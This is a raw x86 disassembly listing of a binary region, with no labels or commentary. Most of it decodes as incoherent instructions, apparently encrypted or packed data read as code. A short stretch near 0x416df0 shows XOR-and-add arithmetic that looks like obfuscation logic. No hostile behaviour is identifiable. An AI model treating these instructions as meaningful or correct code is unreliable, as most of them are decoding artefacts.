  416ace:	sub    al,BYTE PTR [ebx-0x4e09eb18]
  416ad4:	(bad)  
  416ad5:	shr    BYTE PTR [ebp+0x1b7955ec],1
  416adb:	pop    ecx
  416adc:	adc    al,0xf
  416ade:	add    eax,ebp
  416ae0:	pop    esi
  416ae1:	fs dec esp
  416ae3:	mov    bl,0x6b
  416ae5:	push   ss
  416ae6:	ins    BYTE PTR es:[edi],dx
  416ae7:	cld    
  416ae8:	fwait
  416ae9:	sbb    DWORD PTR [edx+0x152c69cf],esi
  416aef:	mov    ds:0x1bb37b51,al
  416af4:	inc    edx
  416af5:	sub    DWORD PTR [ebx-0x47],edx
  416af8:	mov    ebx,0x79ad371c
  416afd:	rcr    BYTE PTR [ebx+0xa],1
  416b00:	ds mov ch,0xfc
  416b03:	mov    ss,WORD PTR [edx]
  416b05:	jg     0x416b71
  416b07:	jne    0x416b1d
  416b09:	rcl    BYTE PTR [eax],cl
  416b0b:	loopne 0x416ae7
  416b0d:	mov    esp,0x4edcccc5
  416b12:	int    0x36
  416b14:	mov    edx,0xc66c31d2
  416b19:	int    0x1d
  416b1b:	sub    al,0xb2
  416b1d:	mov    cl,0x31
  416b1f:	test   DWORD PTR [eax],ecx
  416b21:	mov    WORD PTR [ebp-0x2e],fs
  416b24:	mov    edi,0x266dbcbd
  416b29:	adc    DWORD PTR [edx],esp
  416b2b:	scas   eax,DWORD PTR es:[edi]
  416b2c:	and    DWORD PTR [ecx-0x6f974ddd],edx
  416b32:	test   eax,0xc29a0977
  416b37:	sbb    esi,esp
  416b39:	sub    DWORD PTR [eax+0x33],edi
  416b3c:	cmc    
  416b3d:	inc    esi
  416b3e:	fld    QWORD PTR [ebx+0x1d]
  416b41:	or     DWORD PTR [ebx+ecx*8-0x2a],ebp
  416b45:	cmp    eax,0x24edc4fd
  416b4a:	lahf   
  416b4b:	sbb    BYTE PTR [edx-0x4922a021],ah
  416b51:	les    ebp,FWORD PTR [ecx+edx*8-0x248cd019]
  416b58:	cmp    al,dh
  416b5a:	ficom  DWORD PTR [ecx]
  416b5c:	push   0x7cce099d
  416b61:	fisttp DWORD PTR [edx+eiz*2+0x3]
  416b65:	push   ds
  416b66:	push   ebp
  416b67:	ss jb  0x416b78
  416b6a:	add    DWORD PTR [esi+eiz*1],ebp
  416b6d:	outs   dx,BYTE PTR ds:[esi]
  416b6e:	cmp    al,0x57
  416b70:	push   es
  416b71:	enter  0x6837,0x32
  416b75:	cli    
  416b76:	retf   
  416b77:	nop
  416b78:	test   eax,0x135c37ff
  416b7d:	xor    eax,0xfe61ce11
  416b82:	call   0x716:0x4e956a52
  416b89:	outs   dx,BYTE PTR ds:[esi]
  416b8a:	lods   eax,DWORD PTR ds:[esi]
  416b8b:	test   cl,al
  416b8d:	jb     0x416baa
  416b8f:	lock inc esi
  416b91:	push   ss
  416b92:	sbb    al,0x29
  416b94:	xchg   ebp,eax
  416b95:	iret   
  416b96:	lds    esi,FWORD PTR [edx-0x46b12e8c]
  416b9c:	and    eax,0x8e00f819
  416ba1:	sbb    DWORD PTR [ecx-0xc],eax
  416ba4:	int3   
  416ba5:	mov    ecx,0x5118c3f9
  416baa:	mov    eax,0xe3517e42
  416baf:	sbb    edi,DWORD PTR [ebp+eax*4-0x76]
  416bb3:	rcl    BYTE PTR [edx+0x64],cl
  416bb6:	test   BYTE PTR [esi],dh
  416bb8:	into   
  416bb9:	jle    0x416c33
  416bbb:	out    0x4c,al
  416bbd:	sub    eax,0x99f292a4
  416bc2:	jne    0x416b89
  416bc4:	repnz pop edi
  416bc6:	stos   DWORD PTR es:[edi],eax
  416bc7:	pop    ebx
  416bc8:	test   al,0x92
  416bca:	nop
  416bcb:	into   
  416bcc:	jno    0x416be3
  416bce:	jne    0x416bf8
  416bd0:	imul   ecx,DWORD PTR [edi-0x6c],0xa59cde3f
  416bd7:	pop    DWORD PTR [edx+ecx*2+0x2bdfb2e1]
  416bde:	mov    eax,ds:0xe816051
  416be3:	jle    0x416c2b
  416be5:	adc    BYTE PTR [esi],bh
  416be7:	lods   al,BYTE PTR ds:[esi]
  416be8:	sahf   
  416be9:	fs das 
  416beb:	add    esi,edi
  416bed:	mov    ds,WORD PTR [edi-0x1]
  416bf0:	and    eax,0xbb1f2449
  416bf5:	(bad)  
  416bf6:	out    dx,eax
  416bf7:	inc    ecx
  416bf8:	aas    
  416bf9:	scas   al,BYTE PTR es:[edi]
  416bfa:	jp     0x416bcf
  416bfc:	push   0xe8a2b1db
  416c01:	jo     0x416bf0
  416c03:	fwait
  416c04:	paddq  mm1,QWORD PTR ss:[eax+0x27dae4c2]
  416c0c:	mov    esi,DWORD PTR [eax-0x56]
  416c0f:	mov    ch,0x6a
  416c11:	in     eax,0xd
  416c13:	das    
  416c14:	js     0x416c59
  416c16:	icebp  
  416c17:	addr16 pop ss
  416c19:	int3   
  416c1a:	ret    
  416c1b:	out    0xb3,eax
  416c1d:	ss xor al,0xaa
  416c20:	dec    edx
  416c21:	ins    BYTE PTR es:[edi],dx
  416c22:	or     dh,BYTE PTR [esi+0x5fdb0b50]
  416c28:	xlat   BYTE PTR ds:[ebx]
  416c29:	sar    DWORD PTR [esi+0x5d],cl
  416c2c:	les    ebp,FWORD PTR [ebp+0x74]
  416c2f:	sub    BYTE PTR [edi],bl
  416c31:	test   edi,0xb5eee18e
  416c37:	or     al,0xee
  416c39:	mov    edx,0x204e1855
  416c3e:	aaa    
  416c3f:	retf   0x2a72
  416c42:	sub    eax,0x60f5715b
  416c47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c48:	push   ecx
  416c49:	jb     0x416c4d
  416c4b:	sub    DWORD PTR [ecx-0x3eff892e],eax
  416c51:	jg     0x416c8e
  416c53:	sbb    dl,BYTE PTR [ecx+eax*2+0x235ad1f2]
  416c5a:	sub    al,0x29
  416c5c:	xor    bl,BYTE PTR [edi-0x52ec85da]
  416c62:	mov    eax,DWORD PTR [ecx+edi*4-0x177f317d]
  416c69:	retf   
  416c6a:	loop   0x416ce4
  416c6c:	xor    al,0x5
  416c6e:	iret   
  416c6f:	jbe    0x416c2b
  416c71:	or     eax,DWORD PTR [edi]
  416c73:	adc    ecx,DWORD PTR [ecx-0x53871402]
  416c79:	clc    
  416c7a:	dec    ebx
  416c7b:	in     al,0x1e
  416c7d:	nop
  416c7e:	lea    eax,[edi+ebx*2]
  416c81:	mov    cl,0x5f
  416c83:	pop    ebx
  416c84:	push   esi
  416c85:	mov    ds:0x8afcc602,al
  416c8a:	bound  esi,QWORD PTR [ecx+edi*1+0x21f00229]
  416c91:	jmp    0x189c0e6d
  416c96:	cmp    DWORD PTR [ecx],0x3f
  416c99:	es ret 
  416c9b:	add    eax,0x8639221e
  416ca0:	xchg   ebx,eax
  416ca1:	fwait
  416ca2:	inc    ebx
  416ca3:	mov    ?,WORD PTR [ecx-0x3d28ce12]
  416ca9:	adc    eax,0x2f970299
  416cae:	cmp    esi,edx
  416cb0:	xor    eax,0x7a76bf24
  416cb5:	(bad)  
  416cb7:	ja     0x416ce2
  416cb9:	pop    esi
  416cba:	fs push edi
  416cbc:	bound  eax,QWORD PTR [eax-0x1ac3bc9b]
  416cc2:	pop    esi
  416cc3:	or     DWORD PTR [esi-0x3dacc1],esp
  416cc9:	inc    BYTE PTR [ecx+esi*8-0x46dbfe8b]
  416cd0:	adc    eax,0x40fd648e
  416cd5:	(bad)  
  416cd6:	adc    BYTE PTR [ecx+0x2e],bh
  416cd9:	cmp    BYTE PTR [ebp+0x4bac7b83],al
  416cdf:	push   ecx
  416ce0:	imul   ebp,DWORD PTR [ecx+0x3f],0xffffffd9
  416ce4:	sbb    ecx,edi
  416ce6:	popa   
  416ce7:	loopne 0x416d28
  416ce9:	mov    ds:0xccb78c22,eax
  416cee:	mov    ds:0xd3eae05a,al
  416cf3:	inc    edx
  416cf4:	(bad)  [ebp+0x5d719209]
  416cfa:	or     dl,BYTE PTR [ecx]
  416cfc:	stos   BYTE PTR es:[edi],al
  416cfd:	dec    esi
  416cfe:	stos   BYTE PTR es:[edi],al
  416cff:	push   edx
  416d00:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  416d02:	sub    edi,ebx
  416d04:	retf   0xf0c6
  416d07:	dec    edi
  416d08:	loop   0x416d49
  416d0a:	scas   eax,DWORD PTR es:[edi]
  416d0b:	or     ch,BYTE PTR [esi+0x36]
  416d0e:	push   edi
  416d0f:	sbb    eax,0xbbf320b7
  416d14:	jmp    0x416cfc
  416d16:	dec    ebx
  416d17:	xchg   BYTE PTR [esi+0x55cd3f9e],al
  416d1d:	outs   dx,DWORD PTR ds:[esi]
  416d1e:	dec    ecx
  416d1f:	xchg   dh,ah
  416d21:	sar    ebx,cl
  416d23:	jmp    0x3cf1:0xcc957f4c
  416d2a:	adc    ch,dh
  416d2c:	xchg   esp,eax
  416d2d:	mov    ds:0xa56fd45b,al
  416d32:	int3   
  416d33:	pop    esp
  416d34:	addr16 sbb eax,0x2ab9653a
  416d3a:	lds    esi,FWORD PTR [esi+0x18acee0b]
  416d40:	mov    ss,WORD PTR [eax-0x2d]
  416d43:	push   cs
  416d44:	jle    0x416d7a
  416d46:	icebp  
  416d47:	clc    
  416d48:	fs adc dl,bl
  416d4b:	xchg   ecx,eax
  416d4c:	push   esi
  416d4d:	sub    al,0xb0
  416d4f:	mov    edx,0x8a567d86
  416d54:	loope  0x416dca
  416d56:	daa    
  416d57:	(bad)  
  416d58:	xor    eax,eax
  416d5a:	sar    DWORD PTR [edi],0x76
  416d5d:	fstp   DWORD PTR ds:0x5d3a80c6
  416d63:	mov    ch,0xcf
  416d65:	ret    0x1cf5
  416d68:	sti    
  416d69:	sbb    dh,al
  416d6b:	ror    BYTE PTR [ebx+eax*4],cl
  416d6e:	and    al,0xe3
  416d70:	push   ss
  416d71:	pop    es
  416d72:	mov    ds:0xab2167ac,eax
  416d77:	mov    edi,0x6bff3d28
  416d7c:	mov    dh,0x4f
  416d7e:	dec    edx
  416d7f:	and    eax,0x2c1435c6
  416d84:	or     eax,0x15050d7b
  416d89:	jmp    0x81ddd8bc
  416d8e:	aam    0x9d
  416d90:	aam    0xdd
  416d92:	jle    0x416d52
  416d94:	pop    edi
  416d95:	hlt    
  416d96:	inc    edx
  416d97:	daa    
  416d98:	xor    eax,0xc41aa1b8
  416d9d:	shr    DWORD PTR ds:0xd7f2a6dd,1
  416da3:	ss dec esi
  416da5:	call   0xc73815de
  416daa:	sti    
  416dab:	adc    al,0x7b
  416dad:	(bad)  
  416dae:	or     eax,0x46e9a042
  416db3:	mov    ecx,0xe43bbc17
  416db8:	aad    0x3d
  416dba:	retf   
  416dbb:	sub    esp,0x28
  416dbe:	cwde   
  416dbf:	fild   DWORD PTR ds:0x59289a8
  416dc5:	mov    esp,0x7ed0af10
  416dca:	hlt    
  416dcb:	xchg   BYTE PTR [ebx+0x65],cl
  416dce:	ins    DWORD PTR es:[edi],dx
  416dcf:	mov    WORD PTR [edi+0x58751d1],?
  416dd5:	cmp    al,0x4b
  416dd7:	xor    dl,al
  416dd9:	jmp    0xfe8f01a4
  416dde:	fbld   TBYTE PTR [eax+0x65]
  416de1:	aad    0xb9
  416de3:	ss mov ebx,0x747889be
  416de9:	sub    al,0xb5
  416deb:	in     eax,0xe2
  416ded:	bound  esi,QWORD PTR [ebx]
  416def:	(bad)  
  416df0:	add    eax,edi
  416df2:	add    edx,edi
  416df4:	imul   eax,edx
  416df7:	add    eax,DWORD PTR [ebp-0xc]
  416dfa:	mov    DWORD PTR [ebp-0xc],eax
  416dfd:	mov    eax,DWORD PTR [ebp-0xc]
  416e00:	mov    edx,DWORD PTR [ebp-0x20]
  416e03:	sub    eax,edi
  416e05:	sub    edx,edi
  416e07:	xor    eax,esi
  416e09:	xor    edx,esi
  416e0b:	cmp    edx,eax
  416e0d:	jne    0x4102d1
  416e13:	mov    eax,DWORD PTR [ebp-0x1c]
  416e16:	mov    edx,DWORD PTR [ebp-0x20]
  416e19:	xor    eax,esi
  416e1b:	add    eax,edi
  416e1d:	imul   eax,edx
  416e20:	mov    edx,DWORD PTR [ebp-0x24]
  416e23:	xor    edx,esi
  416e25:	add    edx,edi
  416e27:	or     eax,edx
  416e29:	mov    edx,DWORD PTR [ebp-0x18]
  416e2c:	xor    edx,esi
  416e2e:	add    eax,edx
  416e30:	mov    edx,DWORD PTR [ebp-0x18]
  416e33:	xor    edx,esi
  416e35:	add    eax,edx
  416e37:	mov    edx,DWORD PTR [ebp-0x10]
  416e3a:	lea    eax,[eax+edx*1+0x64e5b6]
  416e41:	jmp    0x4191ca
  416e46:	jmp    0x4191bb
  416e4b:	push   ebx
  416e4c:	ja     0x416e99
  416e4e:	cmp    BYTE PTR [ebx],ch
  416e50:	add    al,0xe3
  416e52:	adc    esp,ebp
  416e54:	xchg   edx,eax
  416e55:	push   edx
  416e56:	mov    al,0x4f
  416e58:	or     al,0x1a
  416e5a:	jno    0x416e13
  416e5c:	and    al,0x61
  416e5e:	bound  ecx,QWORD PTR [edx]
  416e60:	pop    edi
  416e61:	bound  esp,QWORD PTR [edx+0x14]
  416e64:	pop    ss
  416e65:	xor    ebx,DWORD PTR [ebx-0x62]
  416e68:	ss push ebp
  416e6a:	push   cs
  416e6b:	loope  0x416e97
  416e6d:	dec    ebp
  416e6e:	pop    ebx
  416e70:	loopne 0x416df5
  416e72:	jle    0x416e08
  416e74:	sbb    BYTE PTR [ecx+0x42759a7b],dh
  416e7a:	xchg   edx,eax
  416e7b:	or     DWORD PTR [ebx+0x65],edx
  416e7e:	xor    dl,bl
  416e80:	das    
  416e81:	cmp    DWORD PTR [ebp+0x78],0x916b3a69
  416e88:	stos   BYTE PTR es:[edi],al
  416e89:	ror    eax,0x75
  416e8c:	lods   al,BYTE PTR ds:[esi]
  416e8d:	scas   al,BYTE PTR es:[edi]
  416e8e:	sbb    eax,0xc4dc628e
  416e93:	stos   BYTE PTR es:[edi],al
  416e94:	jecxz  0x416f05
  416e96:	xchg   ecx,eax
  416e97:	push   ds
  416e98:	stos   DWORD PTR es:[edi],eax
  416e99:	dec    eax
  416e9a:	mov    ?,ebp
  416e9c:	inc    edi
  416e9d:	aaa    
  416e9e:	mov    ds:0x60e51194,al
  416ea3:	addr16 nop
  416ea5:	nop
  416ea6:	sar    DWORD PTR [ecx-0x50],cl
  416ea9:	pusha  
  416eaa:	mov    bh,0x50
  416eac:	outs   dx,DWORD PTR ds:[esi]
  416ead:	dec    esp
  416eae:	outs   dx,DWORD PTR ds:[esi]
  416eaf:	jl     0x416e43
  416eb1:	out    0xce,eax
  416eb3:	inc    edx
  416eb4:	ins    DWORD PTR es:[edi],dx
  416eb5:	jno    0x416f1b
  416eb7:	test   BYTE PTR [edi-0x52],cl
  416eba:	outs   dx,DWORD PTR ds:[esi]
  416ebb:	ds mov ebp,0x3b2386ed
  416ec1:	xor    al,0x3f
  416ec3:	les    edx,FWORD PTR [ebx+0x22]
  416ec6:	mov    edi,0x822d46c0
  416ecb:	or     edi,DWORD PTR [ebx+0x434e6066]
  416ed1:	out    dx,al
  416ed2:	push   edi
  416ed3:	mov    ch,0x2
  416ed5:	and    dl,BYTE PTR [ecx]
  416ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ed8:	dec    esi
  416ed9:	pop    ecx
  416eda:	bound  edi,QWORD PTR [ecx]
  416edc:	lahf   
  416edd:	mov    al,0xae
  416edf:	sti    
  416ee0:	or     ah,ch
  416ee2:	mov    dl,0xd6
  416ee4:	test   dh,0x4b
  416ee7:	shr    DWORD PTR [ebp-0x13],0x56
  416eeb:	sti    
  416eec:	clc    
  416eed:	add    edi,DWORD PTR [esi]
  416eef:	and    bh,BYTE PTR [edi-0x6a6fbb97]
  416ef5:	pop    edx
  416ef6:	push   cs
  416ef7:	mov    al,0x82
  416ef9:	aam    0x8c
  416efb:	jp     0x416ee9
  416efd:	mov    bl,0x56
  416eff:	retf   
  416f00:	inc    ebx
  416f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f02:	xor    DWORD PTR [ebx+ecx*8+0x141dba1d],esp
  416f09:	mov    bl,0xd6
  416f0b:	sbb    ecx,DWORD PTR [edx+0x6b]
  416f0e:	pop    eax
  416f0f:	xchg   ebx,eax
  416f10:	mov    ch,0xd9
  416f12:	xor    BYTE PTR [esi-0x370c29e2],dl
  416f18:	cmp    ch,BYTE PTR [edx-0x4faaec0]
  416f1e:	outs   dx,DWORD PTR ds:[esi]
  416f1f:	int3   
  416f20:	es shl edi,1
  416f23:	loopne 0x416f74
  416f25:	cdq    
  416f26:	and    DWORD PTR [edi+ecx*1-0x1d],eax
  416f2a:	push   ecx
  416f2b:	and    bl,BYTE PTR [edx-0x43481a5d]
  416f31:	mov    cs,WORD PTR [ecx]
  416f33:	and    eax,0x88e4184
  416f38:	inc    edi
  416f39:	mov    bh,ah
  416f3b:	aas    
  416f3c:	pusha  
  416f3d:	jg     0x416f30
  416f3f:	or     eax,0x394395d5
  416f44:	lahf   
  416f45:	inc    ebx
  416f46:	push   es
  416f47:	addr16 jne 0x416ee7
  416f4a:	sub    al,0xfb
  416f4c:	(bad)  
  416f4d:	mov    edx,?
  416f4f:	call   0xebab:0xad1ab805
  416f56:	add    BYTE PTR [ebx],ch
  416f58:	in     al,0x4e
  416f5a:	mov    al,0x0
  416f5c:	jg     0x416f83
  416f5e:	mov    edi,eax
  416f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f61:	cmp    DWORD PTR [esi+0xa],0x39
  416f65:	xchg   ebx,eax
  416f66:	sbb    BYTE PTR [ebx],dh
  416f68:	jne    0x416f88
  416f6a:	sbb    eax,0x3895eccc
  416f6f:	ret    0x3545
  416f72:	daa    
  416f73:	test   BYTE PTR [esi],0x2a
  416f76:	mov    ?,WORD PTR [ecx-0x1b]
  416f79:	mov    eax,0x1966e656
  416f7e:	push   0x98cfa4ce
  416f83:	xor    eax,0x9c1a8a1
  416f88:	xchg   edx,eax
  416f89:	rcr    DWORD PTR [edi],0x7b
  416f8c:	in     al,0x79
  416f8e:	(bad)  
  416f8f:	(bad)  
  416f90:	sub    DWORD PTR [esi+eax*8+0x171f261],ebx
  416f97:	cmp    al,0xe6
  416f99:	sbb    DWORD PTR [esi],edx
  416f9b:	cmp    al,0x94
  416f9d:	mov    es,WORD PTR [ebp+0x61]
  416fa0:	jg     0x416fcc
  416fa2:	mov    ds:0x8264ba51,al
  416fa7:	xchg   edi,eax
  416fa8:	mov    ah,0xe6
  416faa:	push   edi
  416fab:	pop    edi
  416fac:	mov    eax,0xa5a52487
  416fb1:	mov    ah,0xfc
  416fb3:	mov    al,0xc7
  416fb5:	sub    al,0x85
  416fb7:	mov    al,ds:0xd4b35d8b
  416fbc:	push   edi
  416fbd:	or     BYTE PTR [esp+ecx*8],0x49
  416fc1:	jg     0x417010
  416fc3:	ins    DWORD PTR es:[edi],dx
  416fc4:	or     DWORD PTR [ebx+0x73],eax
  416fc7:	rol    esi,0x59
  416fca:	fcom   QWORD PTR [esi+ebp*1-0x4493b735]
  416fd1:	dec    edi
  416fd2:	or     edx,eax
  416fd4:	jb     0x41702f
  416fd6:	inc    edi
  416fd7:	es int 0x9d
  416fda:	inc    edi
  416fdb:	rol    dh,cl
  416fdd:	aam    0x5b
  416fdf:	leave  
  416fe0:	out    dx,eax
  416fe1:	adc    ah,cl
  416fe3:	pop    ss
  416fe4:	and    al,0x6b
  416fe6:	xor    BYTE PTR [edi+0x7c],ah
  416fe9:	(bad)  
  416fea:	mov    ecx,0x5226b917
  416fef:	repz adc eax,DWORD PTR [eax]
  416ff2:	sbb    eax,DWORD PTR [ebp-0x7c]
  416ff5:	dec    esp
  416ff6:	inc    ebp
  416ff7:	std    
  416ff8:	or     BYTE PTR [esi+0x704a6fd6],cl
  416ffe:	dec    ebx
  416fff:	enter  0x9ec5,0x13
  417003:	inc    ecx
  417004:	mov    DWORD PTR ds:0xf883d36f,ebx
  41700a:	jns    0x416fc6
  41700c:	or     al,BYTE PTR [ecx]
  41700e:	loopne 0x416fcd
  417010:	mov    esp,0x2fcecc93
  417015:	jl     0x416fc7
  417017:	jns    0x417050
  417019:	pop    ds
  41701a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41701b:	mov    DWORD PTR [ebp+0x133b7adc],ecx
  417021:	dec    esp
  417022:	fwait
  417023:	push   ss
  417024:	cmp    edx,ecx
  417026:	adc    al,al
  417028:	sahf   
  417029:	pop    edi
  41702a:	call   0xc329ac6b
  41702f:	cmp    eax,0x24dfbb75
  417034:	or     DWORD PTR [eax],eax
  417036:	aaa    
  417037:	dec    ebx
  417038:	popf   
  417039:	dec    ecx
  41703a:	push   eax
  41703b:	sub    BYTE PTR ds:0x61037d2e,ah
  417041:	in     eax,dx
  417042:	rcr    DWORD PTR [edi-0x3],0xa8
  417046:	xor    ch,bh
  417048:	leave  
  417049:	out    0xff,al
  41704b:	sbb    BYTE PTR [esi+edi*8],bl
  41704e:	mov    ds:0x18adbe37,al
  417053:	mov    eax,0x1f104fdf
  417058:	sar    DWORD PTR [edi+0x29],cl
  41705b:	sub    eax,0xb27241e5
  417060:	cld    
  417061:	pop    es
  417062:	inc    ebp
  417063:	add    BYTE PTR [ebx+0x749d70f7],bh
  417069:	sahf   
  41706a:	cld    
  41706b:	add    esp,DWORD PTR [ebx]
  41706d:	push   es
  41706e:	pop    es
  41706f:	ss xchg ecx,eax
  417071:	lahf   
  417072:	jne    0x4170b9
  417074:	neg    BYTE PTR [esi]
  417076:	mov    WORD PTR [eax],gs
  417078:	shr    DWORD PTR [ecx],cl
  41707a:	jbe    0x417056
  41707c:	xor    eax,0xc6ad180
  417081:	jg     0x417042
  417083:	je     0x4170df
  417085:	xchg   ebp,eax
  417086:	mov    eax,0x91b80f3c
  41708b:	mov    ebx,0x95c55221
  417090:	aas    
  417091:	std    
  417092:	pop    edx
  417093:	push   es
  417094:	lods   eax,DWORD PTR ds:[esi]
  417095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417096:	imul   ch
  417098:	jecxz  0x41710b
  41709a:	and    BYTE PTR [esi+0x9],al
  41709d:	adc    edi,DWORD PTR [esi+0x5e]
  4170a0:	test   DWORD PTR [esi-0x3e],ebx
  4170a3:	outs   dx,DWORD PTR ds:[esi]
  4170a4:	loope  0x41711b
  4170a6:	sar    DWORD PTR [ebx-0x61e8bdce],0x7f
  4170ad:	or     cl,ch
  4170af:	mov    edi,0xc205d1d9
  4170b4:	sbb    eax,0xf57e5159
  4170b9:	lea    esp,[ebp+ebx*2-0x7f]
  4170bd:	rol    DWORD PTR [esi-0xe],0x6b
  4170c1:	mov    cl,0x39
  4170c3:	jb     0x41704b
  4170c5:	rcr    BYTE PTR [edx+0x62],1
  4170c8:	add    BYTE PTR [ebp+0x72],al
  4170cb:	ss push eax
  4170cd:	aaa    
  4170ce:	je     0x41713b
  4170d0:	pusha  
  4170d1:	lds    edx,FWORD PTR [edi+0x7d]
  4170d4:	les    esi,FWORD PTR [esi+ebx*2-0x112ed6a6]
  4170db:	add    edi,ebp
  4170dd:	inc    edx
  4170de:	retf   0xe329
  4170e1:	fdiv   QWORD PTR [ebx-0x70]
  4170e4:	int    0xf8
  4170e6:	lods   al,BYTE PTR ds:[esi]
  4170e7:	sub    BYTE PTR [eax],bh
  4170e9:	shr    DWORD PTR [ecx+0x26],cl
  4170ec:	out    0x9f,eax
  4170ee:	inc    ecx
  4170ef:	hlt    
  4170f0:	dec    DWORD PTR [edx-0x24175936]
  4170f6:	add    dl,0xe
  4170f9:	test   BYTE PTR [edx],dh
  4170fb:	adc    DWORD PTR [ebx+ebp*4],0xffffffa2
  4170ff:	cmp    al,0x32
  417101:	loope  0x4170c1
  417103:	push   es
  417104:	or     BYTE PTR [edi+edi*2-0x67],cl
  417108:	cmp    dh,dl
  41710a:	push   ds
  41710b:	jge    0x4170bd
  41710d:	or     eax,0x9b2b914f
  417112:	fld    TBYTE PTR [edx-0x1ab51e4f]
  417118:	es push ebx
  41711a:	push   es
  41711b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41711c:	jbe    0x417157
  41711e:	push   edi
  41711f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417120:	inc    esp
  417121:	sbb    al,0xfa
  417123:	fstp   DWORD PTR [edi]
  417125:	add    eax,0xfed8c2ac
  41712a:	mov    cl,0xdb
  41712c:	push   cs
  41712d:	push   edx
  41712e:	pop    ecx
  41712f:	arpl   WORD PTR [esi+ebp*1+0x1e],cx
  417133:	test   DWORD PTR [ebx+0x337294bf],ebp
  417139:	rol    DWORD PTR ds:0x19d3bb0e,0xcc
  417140:	(bad)  
  417141:	fs and al,0xe1
  417144:	fwait
  417145:	arpl   WORD PTR [eax-0x2b],si
  417148:	sub    dl,cl
  41714a:	jp     0x4170d7
  41714c:	mov    dl,0x8
  41714e:	ficom  DWORD PTR [esi]
  417150:	add    DWORD PTR [edx+ebx*8+0x57],esi
  417154:	jp     0x4171d4
  417156:	mov    ds:0xe8c65fe2,eax
  41715b:	ja     0x4171d8
  41715d:	mov    dh,0xb0
  41715f:	push   es
  417160:	xchg   esp,eax
  417161:	sbb    al,0x16
  417163:	jecxz  0x41710c
  417165:	push   0x2f7e5913
  41716a:	mov    ebp,0x5e1eeff
  41716f:	push   edx
  417170:	add    eax,0x32fba426
  417175:	cmp    edi,DWORD PTR [esi-0x792378c9]
  41717b:	enter  0x800e,0x88
  41717f:	loopne 0x4171fb
  417181:	lds    edx,FWORD PTR [ebx]
  417183:	adc    eax,0xa10936d3
  417188:	fsub   st,st(2)
  41718a:	dec    ebx
  41718b:	(bad)  
  41718c:	pop    ds
  41718d:	xor    DWORD PTR [esi],esi
  41718f:	add    edx,eax
  417191:	pop    esi
  417192:	mov    ebx,0xb9519100
  417197:	ds and dl,0x96
  41719b:	loope  0x417215
  41719d:	xchg   ecx,eax
  41719e:	rcl    DWORD PTR [ebx+0x20761e5b],0x5d
  4171a5:	lods   eax,DWORD PTR ds:[esi]
  4171a6:	mov    al,ds:0x61c5f352
  4171ab:	sub    DWORD PTR [ebp-0x3f],edi
  4171ae:	jbe    0x417177
  4171b0:	jb     0x4171ab
  4171b2:	pop    ss
  4171b3:	pop    ecx
  4171b4:	icebp  
  4171b5:	sub    bh,ah
  4171b7:	push   edx
  4171b8:	pop    ebx
  4171b9:	ror    ch,1
  4171bb:	jmp    0xf151315d
  4171c0:	dec    esi
  4171c1:	dec    esp
  4171c2:	pop    ss
  4171c3:	jo     0x4171ed
  4171c5:	fwait
  4171c6:	jae    0x417195
  4171c8:	dec    ecx
  4171c9:	(bad)  
  4171ca:	imul   eax,DWORD PTR [ecx+0x2475b4a5],0xffffffc6
  4171d1:	jne    0x4171de
  4171d3:	cmp    BYTE PTR [edx-0x4c3fd31e],0xe7
  4171da:	gs xor al,0xa3
  4171dd:	adc    BYTE PTR [edx],ch
  4171df:	push   0xffffffe1
  4171e1:	mov    al,0x97
  4171e3:	shl    BYTE PTR [ebx],0x76
  4171e6:	ss aad 0x3a
  4171e9:	(bad)  
  4171ea:	icebp  
  4171eb:	inc    eax
  4171ec:	addr16 addr16 and dl,0xbb
  4171f1:	das    
  4171f2:	mov    bh,al
  4171f4:	nop
  4171f5:	xor    ebp,esp
  4171f7:	xor    dh,BYTE PTR [ebx+eiz*8]
  4171fa:	mov    ds:0xa77e9557,eax
  4171ff:	cwde   
  417200:	loop   0x41723a
  417202:	fdiv   DWORD PTR [ebx+0x13b610a3]
  417208:	rcl    ah,0x8d
  41720b:	sti    
  41720c:	mov    ah,0xd5
  41720e:	xchg   DWORD PTR [esi],edi
  417210:	mov    bl,0x5a
  417212:	(bad)  
  417213:	ror    BYTE PTR [esi+esi*1-0x36],0x4c
  417218:	in     eax,dx
  417219:	inc    ebx
  41721a:	(bad)
  41721e:	and    eax,0xefb2e217
  417223:	add    ecx,ebp
  417225:	adc    DWORD PTR [esi],edx
  417227:	(bad)  
  417228:	dec    edi
  41722a:	aad    0x9
  41722c:	iret   
  41722d:	hlt    
  41722e:	xor    DWORD PTR [ecx+0x7924c281],0x45c9750f
  417238:	jne    0x41720a
  41723a:	jae    0x417241
  41723c:	inc    edx
  41723d:	sbb    BYTE PTR ds:0x81639c4a,0x62
  417244:	push   0xa661c714
  417249:	stos   DWORD PTR es:[edi],eax
  41724a:	push   ebp
  41724b:	cmp    dl,bh
  41724d:	inc    ebp
  41724e:	gs jl  0x4172c8
  417251:	and    eax,0xeef910d1
  417256:	ja     0x417256
  417258:	dec    ecx
  417259:	sbb    al,0xf
  41725b:	cli    
  41725c:	sbb    esp,DWORD PTR [ecx]
  41725e:	or     BYTE PTR [eax+0x3d0a44e7],al
  417264:	pop    ss
  417265:	ins    BYTE PTR es:[edi],dx
  417266:	pop    ecx
  417267:	sub    al,0x7b
  417269:	scas   eax,DWORD PTR es:[edi]
  41726a:	rol    DWORD PTR [edi+eax*4],cl
  41726d:	sbb    DWORD PTR [esi],ebx
  41726f:	jb     0x4172a7
  417271:	push   esi
  417272:	in     eax,0xb3
  417274:	imul   edi,eax,0x2e
  417277:	adc    bl,ah
  417279:	fdiv   QWORD PTR [edi+0x3472d262]
  41727f:	jp     0x41725c
  417281:	mov    dl,0xec
  417283:	push   eax
  417284:	jnp    0x41724e
  417286:	aad    0x8e
  417288:	nop
  417289:	xchg   edx,eax
  41728a:	mov    es,WORD PTR [eax]
  41728c:	push   0xbbd5eadc
  417291:	xchg   ecx,eax
  417292:	call   0xce422bd7
  417297:	xor    eax,0x953a71c4
  41729c:	call   0xc697c5
  4172a1:	push   ebx
  4172a2:	aaa    
  4172a3:	xchg   BYTE PTR [esi+0x8da8fac],dl
